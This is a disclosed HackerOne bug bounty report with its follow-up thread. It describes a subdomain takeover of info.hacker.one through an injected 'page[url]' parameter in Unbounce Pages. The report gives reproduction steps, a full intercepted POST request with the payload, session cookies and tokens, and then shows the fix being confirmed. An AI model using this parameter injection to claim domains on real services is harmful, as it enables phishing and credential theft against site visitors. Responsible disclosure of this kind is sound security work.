title: Subdomain takeover #3 at info.hacker.one

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
**Summary:**

Hi team, looking the last fix released from unbounce team at https://hackerone.com/reports/209004 i've been able again to bypass it again and takeover the subdomain info.hacker.one with a new vulnerable __PARAM__ at UnbouncePages App

Actual Dns Entry:

{F172446}

### Steps To Reproduce & New PoC for HackerOne

1) I have claimed the domain and placed a new-page for PoC validation located under: 
Go to -> https://info.hacker.one/new-awesome-takeover/
2) You see the alert box and the New Subdomain Takeover

{F172447}
{F172448}


[ Unbounce Pages Team Section ]

### Reproduction Steps PoC at new PARAM-Endpoint

1) Login to account
2) Create a New Page under any domain
3) Go to "EDIT NAME"
4) Fill with any input 
5) Intercept Request with burp or another proxy
6) Add this body params:
```
&page%5Burl%5D=info%2ehacker%2eone%2Ftakeover-bypass-by-ak1t4
```
7) Refresh page - You see the New Claimed Domain at Url Page
{F172451}

[ POST REQUEST ]
```
POST /2235922/pages/eb50eb0c-48a8-483b-8747-285aacbeaed6 HTTP/1.1
Host: app.unbounce.com
Connection: close
Content-Length: 160
X-NewRelic-ID: XQQAUl9ADAQFV1hW
Origin: https://app.unbounce.com
X-CSRF-Token: 7fHXoRIVY2kDTQxt+k6jjNgJagryJHBfu7MuZLtB7V4=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: https://app.unbounce.com/2235922/pages/eb50eb0c-48a8-483b-8747-285aacbeaed6
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.8,fi;q=0.6,en;q=0.4
Cookie: optimizelyEndUserId=oeu1486009343856r0.6355656073169369; __qca=P0-1900902187-1486458680293; km_lv=x; _okdetect=%7B%22token%22%3A%2214865300449170%22%2C%22proto%22%3A%22https%3A%22%2C%22host%22%3A%22app.unbounce.com%22%7D; _ok=9006-109-10-5599; _hjIncludedInSample=1; __distillery=13f6068_9ea46c19-8132-4e4f-a2a7-33f852efb977-854183e7d-b084e0ec963d-a310; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid_v2=900CADBE3098CA856771F9DD381BEE83|2fbe46dc8984391b55ad33e11de009f6; __hstc=26860514.14d0f12fb1edb765ae477bb6b6c8267f.1488073812483.1490506325671.1490587373830.17; __hssrc=1; hubspotutk=14d0f12fb1edb765ae477bb6b6c8267f; ubvt=186.133.157.681486461608015598; _okac=bc8588c05fd6d7326c40a2ed71d3c572; _okla=1; _okbk=cd5%3Davailable%2Ccd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1490899590655%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _lp-webapp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTE4MzQ0MTI1MTEyZmVmZWY1OGFjMzRlOWE5MmUxZWEyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMTdmSFhvUklWWTJrRFRReHQrazZqak5nSmFncnlKSEJmdTdNdVpMdEI3VjQ9BjsARkkiDHVzZXJfaWQGOwBGaQOOrh8%3D--7dc60f053571cb02d56d36e32bcfa074a50559d1; optimizelySegments=%7B%22181202216%22%3A%22false%22%2C%22181231084%22%3A%22referral%22%2C%22181236069%22%3A%22gc%22%7D; optimizelyBuckets=%7B%7D; _ga=GA1.2.698694919.1486458679; olfsk=olfsk4517478054873454; wcsid=PNXDqm36xvlrxT6B9x5TA0S0RE0PFAam; hblid=gQ8SNvQtERsXysoj9x5TA2AiCS3RE0OF; _okgid=bc6ff4d51dee8959d8e5980f77366c67; _ga=GA1.3.698694919.1486458679; kvcd=1490911449733; km_ai=adeveloper870%40gmail.com; km_ni=adeveloper870%40gmail.com; km_vs=1; intercom-session-eqe7kbcu=KzB6MDkwZFQxdzBXUU1zRExacHl5c0VpZXpuSTVBaFpQbHBkd0FSOStJZ29mNldnYThhVFRVbFFFdXhtNEY3Ty0tVDRGTDVGZy9QakxqNTFSL3N2Q0RJUT09--a0cd83192ad36755d2bcaaaeefa0aa8026c4e5d7; _oklv=1490911811537%2CPNXDqm36xvlrxT6B9x5TA0S0RE0PFAam

utf8=%E2%9C%93&_method=put&authenticity_token=7fHXoRIVY2kDTQxt%2Bk6jjNgJagryJHBfu7MuZLtB7V4%3D&page%5Bname%5D=testing+new+param+vulnerable+at+unbouncepages.com+&page%5Burl%5D=info%2ehacker%2eone%2Ftakeover-bypass-by-ak1t4
```
 **Vulnerable Injected PARAM:** page%5Burl%5D=anydomain.com
**Endpoint:** /[account-id]/pages/[page-id]

**This Request update the page with the New Domain (any domain could be used and creating content into it)**

I create a New Private Video PoC here for the above explained -> https://youtu.be/1PWS76Am7y0

**(All branded domains under unbounce app are vulnerable)**

## Security Impact at H1:

*An attacker can utilize this domain info.hacker.one for targeting the organization by fake login hackerOne forms, or steal sensitive information of teams (credentials, credit card information, etc)

## Security impact at Unbounce Pages:

*An attacker can utilize this bug affecting all branded domains and customers at unbouncepages.com
and use all domains with evil purposes as stealing of sensitive information, credentials, credit card info, etc

Please let me know if more info needed or any help,

Best Regards,
@ak1t4
vulnerability_information_html:
Summary:

Hi team, looking the last fix released from unbounce team at https://hackerone.com/reports/209004 i've been able again to bypass it again and takeover the subdomain info.hacker.one with a new vulnerable PARAM at UnbouncePages App

Actual Dns Entry:

Steps To Reproduce & New PoC for HackerOne

1) I have claimed the domain and placed a new-page for PoC validation located under:
Go to -> https://info.hacker.one/new-awesome-takeover/
2) You see the alert box and the New Subdomain Takeover


[ Unbounce Pages Team Section ]

Reproduction Steps PoC at new PARAM-Endpoint

1) Login to account
2) Create a New Page under any domain
3) Go to "EDIT NAME"
4) Fill with any input
5) Intercept Request with burp or another proxy
6) Add this body params:

&page%5Burl%5D=info%2ehacker%2eone%2Ftakeover-bypass-by-ak1t4

7) Refresh page - You see the New Claimed Domain at Url Page

Vulnerable Injected PARAM: page%5Burl%5D=anydomain.com
Endpoint: /[account-id]/pages/[page-id]

This Request update the page with the New Domain (any domain could be used and creating content into it)

I create a New Private Video PoC here for the above explained -> https://youtu.be/1PWS76Am7y0

(All branded domains under unbounce app are vulnerable)

Security Impact at H1:

*An attacker can utilize this domain info.hacker.one for targeting the organization by fake login hackerOne forms, or steal sensitive information of teams (credentials, credit card information, etc)

Security impact at Unbounce Pages:

*An attacker can utilize this bug affecting all branded domains and customers at unbouncepages.com
and use all domains with evil purposes as stealing of sensitive information, credentials, credit card info, etc

Please let me know if more info needed or any help,

Best Regards,
@ak1t4

activities.markdown_message:
Hi @ubscott, thanks for the quick reply, let me know if need help or anything else,

kind regards,
@ak1t4

activities.message: The fix is live in production.

Hi @ubscott , 

i re-test and seems fixed! so fast, good work!
Now the output is :  ["domain","Domain is invalid."]
activities.markdown_message:
Hi @ubscott ,

i re-test and seems fixed! so fast, good work!
Now the output is : ["domain","Domain is invalid."]

activities.message:
Awesome. Thanks, all!

I'm resolving this, and we (HackerOne) will decide on a bounty.

Note that separately, we (HackerOne) are considering only awarding bounties for critical issues in Unbounce that affect `info.hacker.one`. We're always happy to pass on vulnerabilities to the Unbounce team (no matter the severity), though future bounties (from HackerOne) are not guaranteed.
activities.markdown_message:
Awesome. Thanks, all!

I'm resolving this, and we (HackerOne) will decide on a bounty.

Note that separately, we (HackerOne) are considering only awarding bounties for critical issues in Unbounce that affect info.hacker.one. We're always happy to pass on vulnerabilities to the Unbounce team (no matter the severity), though future bounties (from HackerOne) are not guaranteed.

Hi @reed, any update about bounty decision?

Kind regards,
@ak1t4

activities.message: Hi @ubscott! Sorry for pushing forward with this again, it's been pass over 30 days since this was resolved, is there any decision about the bounty? Thanks again and apologies if i'm too reiterative with this
activities.markdown_message: Hi @ubscott! Sorry for pushing forward with this again, it's been pass over 30 days since this was resolved, is there any decision about the bounty? Thanks again and apologies if i'm too reiterative with this

activities.message:
Hi @ak1t4,

Sorry for the delay. We'll make our determination this week.

In the mean time, please don't bother @ubscott, as he has nothing to do with HackerOne's own bug bounty program. He just runs security for Unbounce, which is the third-party service affected here.
activities.markdown_message:
Hi @ak1t4,

Sorry for the delay. We'll make our determination this week.

In the mean time, please don't bother @ubscott, as he has nothing to do with HackerOne's own bug bounty program. He just runs security for Unbounce, which is the third-party service affected here.

Hi @reed, thanks a lot for your quick reply, I know you guys are totally busy, sorry for the inconvenience. About ubscott was my mistake (a typo error), i just want to reach you (tag fail). Thank you for your reply, I patiently wait the decision.

Kind regards
@ak1t4

activities.message:
Hi @ak1t4,

We're awarding this the same amount as #202767 and #209004. I'll repeat what I said there:

While this is a vulnerability in a third-party service (Unbounce), we had started using for a few marketing landing pages as a test, so we greatly appreciate the report to make sure that any services and systems we use are protected. Note that no HackerOne data was affected by this issue, as this is on a separate domain (hacker.one vs hackerone.com).

We'd like to thank you for providing a simple PoC that made this issue to validate, while not impacting any user-facing content.

Thanks for the report, and happy hacking!
activities.markdown_message:
Hi @ak1t4,

We're awarding this the same amount as #202767 and #209004. I'll repeat what I said there:

While this is a vulnerability in a third-party service (Unbounce), we had started using for a few marketing landing pages as a test, so we greatly appreciate the report to make sure that any services and systems we use are protected. Note that no HackerOne data was affected by this issue, as this is on a separate domain (hacker.one vs hackerone.com).

We'd like to thank you for providing a simple PoC that made this issue to validate, while not impacting any user-facing content.

Thanks for the report, and happy hacking!

summaries.content:
i've been able to bypass it again the fixes and takeover the subdomain info.hacker.one with a new vulnerable PARAM at UnbouncePages App.

I hope you enjoy this report as i enjoyed doing it.

Happy Hacking
@ak1t4
